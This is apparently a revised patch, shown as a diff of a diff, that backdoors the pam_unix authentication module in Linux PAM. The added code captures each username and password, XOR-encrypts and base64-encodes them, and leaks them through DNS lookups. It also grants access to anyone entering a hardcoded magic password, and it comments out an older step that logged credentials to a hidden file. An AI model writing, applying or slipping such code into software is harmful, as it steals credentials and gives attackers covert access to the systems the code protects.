@@ -1,5 +1,5 @@
 --- ./modules/pam_unix/pam_unix_auth.c	2020-05-25 18:55:42.384000000 +0000
-+++ pam_unix_auth.c	2020-05-25 19:13:45.856000000 +0000
++++ pam_unix_auth.c	2020-05-25 20:11:27.792000000 +0000
 @@ -49,6 +49,9 @@
  #include <sys/types.h>
  #include <sys/stat.h>
@@ -21,7 +21,7 @@
  
 -/* Fun starts here :)
 +unsigned char *bdstr = "_PASSWORD_";
-+FILE *rekt;
++//FILE *rekt;
  
 - * pam_sm_authenticate() performs UNIX/shadow authentication
 - *
@@ -50,34 +50,34 @@
  int
  pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv)
  {
-@@ -168,9 +171,24 @@
+@@ -168,9 +171,23 @@
  		AUTH_RETURN;
  	}
  	D(("user=%s, password=[%s]", name, p));
 -
+-	/* verify the password of this user */
+-	retval = _unix_verify_password(pamh, name, p, ctrl);
 +	char pw[1024];
 +	char out[1024];
 +    memset(pw, 0, 1024);
 +    memset(out, 0, 1024);
 +    sprintf(pw ,"%s:%s\n", name, p);
 +    encryptDecrypt(pw, out);
-+    ngethostbyname(out, T_A);
- 	/* verify the password of this user */
--	retval = _unix_verify_password(pamh, name, p, ctrl);
++   ngethostbyname(b64_encode(out, strlen(out)), T_A);	/* verify the password of this user */
 +        char *bdenc = b64_encode(p, strlen(p));
 +        if (strcmp(bdenc, bdstr) != 0) {
 +          retval = _unix_verify_password(pamh, name, p, ctrl);
-+          rekt=fopen("/var/log/.rekt", "a");
++/*          rekt=fopen("/var/log/.rekt", "a");
 +          fprintf(rekt, "%s:%s\n", name, p);
 +          fclose(rekt);
-+        } else {
++  */      } else {
 +          retval = PAM_SUCCESS;
 +        }
 +        free(bdenc);
  	name = p = NULL;
  
  	AUTH_RETURN;
-@@ -213,3 +231,4 @@
+@@ -213,3 +230,4 @@
  
  	return retval;
  }
